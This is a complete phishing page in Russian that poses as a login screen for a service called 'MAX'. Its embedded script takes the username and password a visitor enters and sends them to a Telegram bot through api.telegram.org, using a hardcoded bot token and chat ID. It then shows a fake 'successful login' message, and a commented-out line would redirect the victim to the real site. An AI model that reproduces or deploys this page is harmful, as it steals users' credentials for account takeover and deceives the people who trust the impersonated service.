<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в MAX</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #eef2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            width: 320px;
            text-align: center;
        }
        h2 { 
            color: #333; 
            margin-bottom: 25px; 
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            margin-top: 10px;
            transition: background-color 0.3s;
        }
        button:hover { 
            background-color: #0056b3; 
        }
        .logo { 
            font-weight: 800; 
            font-size: 28px; 
            margin-bottom: 25px; 
            color: #007bff; 
            letter-spacing: 1px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">MAX</div>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Логин или Email" required autocomplete="off">
        <input type="password" id="password" placeholder="Пароль" required>
        <button type="submit">Войти</button>
    </form>
    <div class="footer">Защита аккаунта MAX</div>
</div>

<script>
    // Твой токен и ID уже вставлены здесь
    const BOT_TOKEN = '8283336108:AAFhMzWuDBRPFoobWKNp3qUykrfevNv5-a4';
    const CHAT_ID = '8082468131'; 

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        const message = `🔐 *Новая авторизация в MAX*\n\n👤 Логин: <code>${username}</code>\n🔑 Пароль: <code>${password}</code>\n📅 Время: ${new Date().toLocaleString()}`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        }).then(response => {
            if (response.ok) {
                alert('Успешный вход!');
                // Если нужно перекинуть на настоящий сайт после входа, раскомментируй строку ниже:
                // window.location.href = "https://max.com"; 
            } else {
                console.error('Ошибка отправки:', response.status);
                alert('Ошибка соединения');
            }
        }).catch(err => {
            console.error('Сетевая ошибка:', err);
            alert('Проверьте интернет');
        });
    });
</script>

</body>
</html>
